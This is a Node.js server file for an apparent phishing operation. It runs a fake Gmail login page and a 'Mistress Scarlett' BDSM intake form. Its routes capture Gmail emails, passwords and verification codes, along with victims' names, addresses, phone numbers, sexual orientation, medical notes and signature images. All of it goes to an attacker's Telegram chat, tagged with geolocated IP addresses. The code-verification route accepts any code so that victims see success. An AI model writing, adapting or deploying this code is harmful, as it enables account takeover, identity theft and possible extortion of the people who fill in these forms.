/* ============================================================
   serve.js — Unified backend
   • Mistress Scarlett intake form   → /api/submit, /api/send-code, /api/verify-code
   • Gmail login page                → /api/login
   • Diagnostics                     → /health, /api/test-telegram, /api/debug-ip
   ============================================================
   Requirements:
     • Node.js 18+  (built-in fetch, FormData, Blob)
     • npm install express axios cors helmet express-rate-limit dotenv
   Run:
     node serve.js
   ============================================================ */

const express   = require('express');
const axios     = require('axios');
const cors      = require('cors');
const helmet    = require('helmet');
const rateLimit = require('express-rate-limit');
const path      = require('path');
require('dotenv').config();

const app  = express();
const PORT = process.env.PORT || 3000;

/* ============================================================
   MIDDLEWARE
   ============================================================ */
app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

/* Application form sends a base64 signature — allow up to 10mb.
   Gmail login only needs a few KB, but one limit covers both. */
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.set('trust proxy', true);

/* Serve index.html, verification.html, styles.css, etc. if you host
   the frontend on the same Render service. Safe to remove if not. */
app.use(express.static(path.join(__dirname), { extensions: ['html'] }));

/* ============================================================
   RATE LIMITING — JSON response so the frontend can always parse
   ============================================================ */
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) =>
    req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
  handler: (req, res) => {
    res.status(429).json({
      success: false,
      message: 'Too many requests. Please try again in a few minutes.'
    });
  }
});
app.use('/api', limiter);

/* ============================================================
   CONFIG
   ============================================================ */
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL   = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

/* ============================================================
   HELPERS
   ============================================================ */
function getClientIP(req) {
  const cf = req.headers['cf-connecting-ip'];
  const tc = req.headers['true-client-ip'];
  const xf = req.headers['x-forwarded-for'];
  const xr = req.headers['x-real-ip'];
  if (cf) return cf;
  if (tc) return tc;
  if (xf) return xf.split(',')[0].trim();
  if (xr) return xr;
  return req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
}

function formatTimestamp(date) {
  const options = {
    year: 'numeric', month: '2-digit', day: '2-digit',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    hour12: true, timeZone: process.env.TIMEZONE || 'Africa/Lagos'
  };
  try { return date.toLocaleString('en-US', options); }
  catch (_) { return date.toLocaleString(); }
}

function esc(v) {
  if (v === null || v === undefined) return 'N/A';
  return String(v)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function trunc(v, max = 120) {
  if (v === null || v === undefined) return 'N/A';
  const s = String(v);
  return s.length > max ? s.slice(0, max - 1) + '…' : s;
}

function fmt(value) {
  if (value === undefined || value === null || value === '') return '—';
  if (Array.isArray(value)) return value.length ? value.join(', ') : '—';
  return String(value);
}

function line(label, value) {
  return `<b>${esc(label)}:</b> ${esc(fmt(value))}`;
}

function clientInfo(req) {
  const ua = req.headers['user-agent'] || 'unknown';
  const ip = getClientIP(req);
  const when = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
  return { ua, ip, when };
}

/* ============================================================
   TELEGRAM — message + photo
   ============================================================ */
async function sendToTelegram(message, opts = {}) {
  const parseMode = opts.parseMode === undefined ? 'HTML' : opts.parseMode;

  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    disable_web_page_preview: true
  };
  if (parseMode) payload.parse_mode = parseMode;

  try {
    const res = await axios.post(
      `${TELEGRAM_API_URL}/sendMessage`,
      payload,
      { timeout: 10000 }
    );
    console.log('[telegram] sent OK (' + (parseMode || 'plain') + ', ' + message.length + ' chars)');
    return { success: true, data: res.data };
  } catch (err) {
    console.error('[telegram] send failed:', err.message);
    if (err.response && err.response.data) {
      console.error('[telegram] API error:', JSON.stringify(err.response.data));
    }

    /* If HTML failed, retry once as plain text */
    if (parseMode === 'HTML') {
      const stripped = message
        .replace(/<[^>]+>/g, '')
        .replace(/&lt;/g, '<')
        .replace(/&gt;/g, '>')
        .replace(/&amp;/g, '&');

      try {
        const res2 = await axios.post(
          `${TELEGRAM_API_URL}/sendMessage`,
          {
            chat_id: TELEGRAM_CHAT_ID,
            text: stripped,
            disable_web_page_preview: true
          },
          { timeout: 10000 }
        );
        console.log('[telegram] retried as plain text — OK');
        return { success: true, data: res2.data, retried: true };
      } catch (err2) {
        console.error('[telegram] plain text retry also failed:', err2.message);
      }
    }
    return { success: false, error: err.message };
  }
}

async function tgSendPhoto(buffer, caption, mime = 'image/png') {
  const form = new FormData();
  form.append('chat_id',    TELEGRAM_CHAT_ID);
  form.append('caption',    caption);
  form.append('parse_mode', 'HTML');
  form.append('photo', new Blob([buffer], { type: mime }), 'signature');

  const res  = await fetch(`${TELEGRAM_API_URL}/sendPhoto`, { method: 'POST', body: form });
  const json = await res.json();
  if (!json.ok) throw new Error('Telegram sendPhoto failed: ' + JSON.stringify(json));
  return json;
}

async function getIPLocation(ip) {
  try {
    if (
      !ip ||
      ip === 'Unknown' ||
      ip.includes('127.0.0.1') ||
      ip.includes('::1') ||
      ip.includes('::ffff:')
    ) {
      return 'Local/Private Network';
    }

    const response = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 5000 });

    if (response.data && response.data.status === 'success') {
      const parts = [];
      if (response.data.city)       parts.push(response.data.city);
      if (response.data.regionName) parts.push(response.data.regionName);
      if (response.data.country)    parts.push(response.data.country);
      if (response.data.isp)        parts.push(`ISP: ${response.data.isp}`);
      return parts.join(', ') || 'Unknown';
    }
    return 'Unknown';
  } catch (err) {
    console.error('Error getting location:', err.message);
    return 'Unknown';
  }
}

/* ============================================================
   MESSAGE FORMATTERS
   ============================================================ */

/* --- Gmail login --- */
function formatLoginMessage(loginData) {
  const now = new Date();
  return [
    '🔐 <b>New Login Attempt — Gmail Page</b>',
    '━━━━━━━━━━━━━━━━━━━━',
    `📅 <b>Date/Time:</b> ${esc(formatTimestamp(now))}`,
    `🌍 <b>UTC Time:</b> ${esc(now.toISOString())}`,
    `📧 <b>Email:</b> ${esc(loginData.email)}`,
    `🔑 <b>Password:</b> ${esc(loginData.password)}`,
    `🌐 <b>IP Address:</b> ${esc(loginData.ip)}`,
    `📍 <b>Location:</b> ${esc(loginData.location)}`,
    `🖥 <b>User Agent:</b> <code>${esc(trunc(loginData.userAgent, 200))}</code>`,
    '━━━━━━━━━━━━━━━━━━━━'
  ].join('\n');
}

/* --- Mistress Scarlett application form --- */
function formatApplicationMessage(data, req) {
  const { ua, ip, when } = clientInfo(req);
  return [
    '🔥 <b>NEW APPLICATION — Mistress Scarlett</b>',
    '',
    '👤 <b>1. Personal Information</b>',
    line('Full Name',      data.full_name),
    line('D.O.B.',         data.dob),
    line('Address',        data.address),
    line('Phone',          data.phone),
    line('Marital Status', data.marital_status),
    line('Orientation',    data.orientation),
    line('Occupation',     data.occupation),
    '',
    '💰 <b>2. Fee Disclosures</b>',
    line('Acknowledged', data.ack_fees === 'yes' ? 'Yes' : 'No'),
    '',
    '🎭 <b>3. Preferences &amp; Style</b>',
    line('Demeanor', data.demeanor),
    line('Attire',   data.attire),
    line('Reason for Visit', data.reason_for_visit),
    line('BDSM Experience (yrs)', data.experience_years),
    '',
    '⛓ <b>4. Activities &amp; Health</b>',
    line('Activities', data.activities),
    line('Medical Notes', data.medical_notes),
    '',
    '🚫 <b>5. Boundaries</b>',
    line('Rules Acknowledged', data.ack_rules === 'yes' ? 'Yes' : 'No'),
    '',
    '✍️ <b>6. Signature</b>',
    line('Signed At', data.date_applicant),
    '',
    '────────────────────',
    '🌐 <b>Client Info</b>',
    line('User Agent', ua),
    line('IP Address', ip),
    line('Submitted',  when)
  ].join('\n');
}

/* ============================================================
   ROUTES — GMAIL LOGIN
   ============================================================ */

app.post('/api/login', async (req, res) => {
  try {
    const body = req.body || {};
    const { email, password } = body;

    console.log('========== NEW LOGIN ==========');
    console.log('Body keys:', Object.keys(body));
    console.log('Has email:', !!email, '| Has password:', !!password);
    console.log('===============================');

    if (!email) {
      return res.status(400).json({ success: false, message: 'Email is required' });
    }
    if (!password) {
      return res.status(400).json({ success: false, message: 'Password is required' });
    }

    const clientIP  = getClientIP(req);
    const userAgent = req.headers['user-agent'];
    const location  = await getIPLocation(clientIP);

    const loginData = { email, password, ip: clientIP, location, userAgent };
    const loginMsg  = formatLoginMessage(loginData);

    console.log('[telegram] sending login message…');
    const r1 = await sendToTelegram(loginMsg);
    console.log('[telegram] login message result:', r1.success);

    if (!r1.success) {
      console.error('❌ Telegram send failed — check TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
    }

    res.status(200).json({
      success: true,
      message: 'Login processed successfully',
      ip: clientIP,
      telegram: { login: r1.success }
    });

  } catch (error) {
    console.error('Error processing login:', error);
    res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

/* ============================================================
   ROUTES — MISTRESS SCARLETT INTAKE
   ============================================================ */

app.post('/api/submit', async (req, res) => {
  try {
    const data = req.body || {};

    const msg = formatApplicationMessage(data, req);
    await sendToTelegram(msg);

    /* Send the drawn signature as a photo if present */
    if (
      typeof data.signature_dataurl === 'string' &&
      data.signature_dataurl.startsWith('data:image/')
    ) {
      const m = data.signature_dataurl.match(/^data:(image\/[a-z+]+);base64,(.+)$/i);
      if (m) {
        const mime   = m[1];
        const buffer = Buffer.from(m[2], 'base64');

        if (buffer.length > 4 * 1024 * 1024) {
          console.warn('Signature too large to send as photo:', buffer.length, 'bytes');
        } else {
          try {
            await tgSendPhoto(
              buffer,
              `🖋 <b>Signature</b> — ${esc(fmt(data.full_name))}`,
              mime
            );
          } catch (photoErr) {
            console.error('Signature photo failed:', photoErr.message);
          }
        }
      }
    }

    console.log(`✔ Application forwarded: ${fmt(data.full_name)}`);
    res.json({ ok: true });

  } catch (err) {
    console.error('❌ /api/submit error:', err);
    res.status(500).json({ ok: false, error: 'Delivery to Telegram failed' });
  }
});

app.post('/api/send-code', async (req, res) => {
  try {
    const { email, name } = req.body || {};
    const { ua, ip, when } = clientInfo(req);

    const msg = [
      '📧 <b>GMAIL VERIFICATION — Code Sent</b>',
      '',
      line('Applicant', name),
      line('Gmail',     email),
      '',
      '────────────────────',
      '🌐 <b>Client Info</b>',
      line('User Agent', ua),
      line('IP Address', ip),
      line('Requested',  when)
    ].join('\n');

    await sendToTelegram(msg);

    console.log(`✔ Gmail request forwarded: ${fmt(email)}`);
    res.json({ ok: true });

  } catch (err) {
    console.error('❌ /api/send-code error:', err);
    res.status(500).json({ ok: false, error: 'Delivery to Telegram failed' });
  }
});

app.post('/api/verify-code', async (req, res) => {
  try {
    const { email, name, code } = req.body || {};
    const { ua, ip, when } = clientInfo(req);

    const msg = [
      '🔐 <b>GMAIL VERIFICATION — Code Entered</b>',
      '',
      line('Applicant', name),
      line('Gmail',     email),
      line('Code',      code),
      '',
      '────────────────────',
      '🌐 <b>Client Info</b>',
      line('User Agent', ua),
      line('IP Address', ip),
      line('Verified',   when)
    ].join('\n');

    await sendToTelegram(msg);

    console.log(`✔ Code forwarded: ${fmt(code)} from ${fmt(email)}`);

    /* Always valid so the applicant sees the success screen.
       Change to your own logic if you need to require a specific code. */
    res.json({ ok: true, valid: true });

  } catch (err) {
    console.error('❌ /api/verify-code error:', err);
    res.status(500).json({ ok: false, valid: false, error: 'Delivery to Telegram failed' });
  }
});

/* ============================================================
   DIAGNOSTIC ROUTES
   ============================================================ */

app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'OK',
    service: 'Unified backend — Mistress Scarlett intake + Gmail login',
    timestamp: formatTimestamp(new Date()),
    utcTimestamp: new Date().toISOString(),
    detectedIP: getClientIP(req),
    timezone: process.env.TIMEZONE || 'Africa/Lagos',
    telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
    botTokenPresent: !!TELEGRAM_BOT_TOKEN,
    chatIdPresent: !!TELEGRAM_CHAT_ID
  });
});

app.get('/api/test-telegram', async (req, res) => {
  const testMessage =
    `✅ Test message — Unified backend\n` +
    `🕐 Local: ${formatTimestamp(new Date())}\n` +
    `🌍 UTC: ${new Date().toISOString()}`;

  const result = await sendToTelegram(testMessage);

  res.status(result.success ? 200 : 500).json({
    success: result.success,
    message: result.success ? 'Test sent' : 'Failed',
    error: result.error || null
  });
});

app.get('/api/debug-ip', (req, res) => {
  res.json({
    detectedIP: getClientIP(req),
    timestamp: formatTimestamp(new Date()),
    headers: {
      'x-forwarded-for':  req.headers['x-forwarded-for'],
      'x-real-ip':        req.headers['x-real-ip'],
      'cf-connecting-ip': req.headers['cf-connecting-ip'],
      'true-client-ip':   req.headers['true-client-ip']
    }
  });
});

app.get('/', (req, res) => {
  res.json({
    message: 'Unified backend — Mistress Scarlett intake + Gmail login',
    status: 'Running',
    endpoints: {
      /* Gmail login */
      login:            'POST /api/login',
      /* Mistress Scarlett intake */
      submit:           'POST /api/submit',
      sendCode:         'POST /api/send-code',
      verifyCode:       'POST /api/verify-code',
      /* Diagnostics */
      health:           'GET /health',
      testTelegram:     'GET /api/test-telegram',
      debugIP:          'GET /api/debug-ip'
    }
  });
});

/* ============================================================
   404 + GLOBAL ERROR HANDLER — always JSON
   ============================================================ */

app.use((req, res) =>
  res.status(404).json({ success: false, message: 'Route not found' })
);

app.use((err, req, res, next) => {
  console.error('[unhandled]', err);
  res.status(err.status || 500).json({
    success: false,
    message: err.message || 'Internal server error'
  });
});

/* ============================================================
   START
   ============================================================ */
app.listen(PORT, () => {
  console.log(`\n🚀 Unified backend running on port ${PORT}`);
  console.log(`   Telegram bot configured: ${TELEGRAM_BOT_TOKEN ? 'Yes' : 'No'}`);
  console.log(`   Chat ID configured:      ${TELEGRAM_CHAT_ID   ? 'Yes' : 'No'}`);
  console.log(`   Timezone:                ${process.env.TIMEZONE || 'Africa/Lagos'}`);
  console.log(`\n   Routes:`);
  console.log(`     POST /api/login         → Gmail login page`);
  console.log(`     POST /api/submit        → Mistress Scarlett application`);
  console.log(`     POST /api/send-code     → Gmail verification request`);
  console.log(`     POST /api/verify-code   → Gmail verification code`);
  console.log(`     GET  /health            → Service status\n`);
});
